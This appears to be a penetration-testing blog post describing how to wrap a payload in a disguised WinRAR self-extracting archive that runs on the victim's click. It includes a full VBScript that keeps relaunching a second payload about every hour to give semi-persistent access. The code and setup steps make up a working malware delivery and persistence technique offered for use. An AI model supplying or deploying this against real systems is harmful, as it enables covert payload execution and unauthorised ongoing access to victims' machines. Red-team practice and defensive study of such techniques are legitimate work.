---
layout: post
title: Semi-Persistence
summary: How to get some semi-persistence using VBScript
featuredimage: /assets/semipersistence2.png
tags:
- payloads
---
     

Persistence is a great thing to have on a pentest, especially if testing from the outside. Persistence also seems to be a word that makes clients' hairs on the back of their necks stand up. Backdoors are a scary thing if you're in charge of keeping a network secure.

When it comes to installing persistence, there are quite a few options available such as Metasploit's persistence module or `scheduleme.rb`. These modules leave a permanent, like one would think, payload and schedule for phoning home to the tester's box. But what about when this is out of scope? 

Here's a method to keep a payload phoning home but leaves no permanent effects. 

Using WinRAR, we can pack our payload with a vbscript that sleeps for 60 minutes and then restarts the payload. 
With WinRAR installed, right click your favorite payload and select WinRar > Add to archive…
The window below will pop up. Select Create SFX archive and keep the Archive format set to RAR. You should also give your payload wrapper an inconspicuous name.

![]({{site.url}}/assets/semipersistence1.png){:height="400px"}


Now duplicate the payload that you just right-clicked and call it something different, it's renamed to `persistence_payload.exe` here. This will be the secondary payload that is run every 60-ish minutes. Why not just use the one payload? Just in case you can't migrate of off the original process, a second one is used for the persistence for safety.


Now create a text file named `persistence_script.vbs` and paste the following within it:

```vb
function launchit()
  WScript.sleep 90000
  set shell = createobject("wscript.shell")
     shell.run "persistence_payload.exe"
  WScript.sleep 90000
  killit()
end function

function killit()
  set objWMIService = GetObject ("winmgmts:")
  foundProc = False
  procName = "persistence_payload.exe"

  for each Process in objWMIService.InstancesOf ("Win32_Process")
        If StrComp(Process.Name,procName,vbTextCompare) = 0 then
            foundProc = True
            procID = Process.ProcessId
        End If
  Next
  If foundProc = True Then
        Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process where ProcessId =" &  procID)
        For Each objProcess in colProcessList   
            objProcess.Terminate()
        Next
        WScript.Sleep(1000) 'wait for a second
        Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process where ProcessId =" &  procID)
        If colProcessList.count = 0 Then
            WScript.Sleep(3600000)
            launchit()
        End If
  End If
end function

launchit()
```

Change the `persistence_payload.exe` line to match your persistent payload's name. After saving this, right click the payload wrapper and select WinRAR > Open with WinRAR. Then drag the persistent payload and `persistence_script.vbs` into WinRAR. You should end up with this:


![]({{site.url}}/assets/semipersistence2.png){:width="90%"}


Almost there, but we need this executable to do something when the victim clicks on it. Click the SFX button in the ribbon. Then under the SFX tab, select Advanced SFX Options. 
Now we have a number of options we can set, such as having this executable extract to a specified folder (`C:/Temp` maybe?), set the Overwrite mode to Overwrite all files (Update tab), and tell WinRAR what to run upon extraction.
After setting the first two options, open the Setup tab and in the Run after extraction box, enter the name of your normal payload (`payload.exe` here) and the VBScript (`persistence_script.vbs`). 

![]({{site.url}}/assets/semipersistence3.png){: width="325px"}


Now when the payload is run, it will run as expected (by calling `payload.exe`) and in Task Manager, a `wscript.exe` process will run waiting to re-rerun `persistence_payload.exe` every 60-ish minutes. Before re-running the payload, it will kill the process if it's still running so if you can't migrate you will lose that session -- best to keep it as a backup in those instances. 

Restarts and logoffs will kill `wscript.exe` resulting in the persistence being lost-- no worries about a permanent backdoor. This method can also be used to launch the initial payload multiple times when first run, if you experience flakiness issues with payloads.

